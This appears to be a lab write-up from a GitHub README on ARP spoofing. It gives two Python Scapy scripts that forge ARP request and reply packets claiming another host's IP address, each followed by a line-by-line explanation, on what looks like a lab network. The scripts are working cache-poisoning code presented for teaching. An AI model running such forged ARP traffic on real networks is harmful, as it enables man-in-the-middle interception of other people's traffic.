# ARP Spoofing Attack
The Address Resolution Protocol (ARP) is a communication protocol used for discovering the link layer address, such as the MAC address, given an IP address. The ARP protocol is a very simple protocol, and it does not implement any security measure.

![diagram](https://user-images.githubusercontent.com/126002808/220416965-09b077df-d999-478f-bdf3-78c42b4dcb50.png)

## ARP Request
```
#!/usr/bin/env python3
from scapy.all import *

# Create Ethernet and ARP objects
ethernet = Ether(dst='02:42:0a:09:00:05', src='02:42:0a:09:00:69')
arp = ARP(op=1, pdst='10.9.0.5', hwsrc='02:42:0a:09:00:69', hwdst='02:42:0a:09:00:05', psrc='10.9.0.6')

# Echo message before sending packet
print("Nigel is sending an ARP request")

# Send the packet
sendp(ethernet/arp) 
```

This script uses the Scapy library to construct and send an ARP request packet. <br/>
It first creates Ethernet and ARP objects to define the packet's source and destination addresses, as well as the IP addresses involved. <br/>
It then prints the message ```"Nigel is sending an ARP request"``` before sending the packet using the ```sendp``` function.


![arp-req](https://user-images.githubusercontent.com/126002808/220420309-b15b1cf7-e7ce-4ac4-a7c1-ccddfae3b901.png)

## ARP Reply
```
#!/usr/bin/env python3  
from scapy.all import *  
# Create Ethernet and ARP objects  
ethernet = Ether(dst='02:42:0a:09:00:05', src='02:42:0a:09:00:69') 
# ARP reply uses op-2. Previously, ARP request used op=1 
arp = ARP(op=2, pdst='10.9.0.5', hwsrc='02:42:0a:09:00:69', hwdst='02:42:0a:09:00:05', psrc='10.9.0.6')  
# Print the message that Nigel is sending an ARP reply
print("Nigel is sending an ARP reply")
# Send the packet 
sendp(ethernet/arp)  
```

This script is using Scapy, a Python-based packet manipulation tool, to send an ARP reply packet. <br/>
<br/>
The first line ```#!/usr/bin/env python3``` is known as the shebang line.<br/>
It tells the operating system to use the Python 3 interpreter to execute the script. <br/>
<br/>
The second line from ```scapy.all import *``` imports all of the classes and functions in the Scapy library. <br/>
This allows the script to use Scapy to create, manipulate and send network packets. <br/>
<br/>
The next line creates an Ethernet frame with a specified source and destination MAC address. <br/>
<br/>
The next line creates an ARP packet, with a specified source and destination MAC and IP addresses <br/>
This specifies that it is an ARP reply packet by setting the ```'op'``` field to ```2.``` <br/>
<br/>
The line ```print("Nigel is sending an ARP reply")``` prints a message to the console stating that Nigel is sending an ARP reply packet. <br/>
<br/>
Finally, the ```sendp(ethernet/arp)``` function sends the Ethernet frame and ARP packet as a single packet over the network using Scapy's ```sendp()``` function.
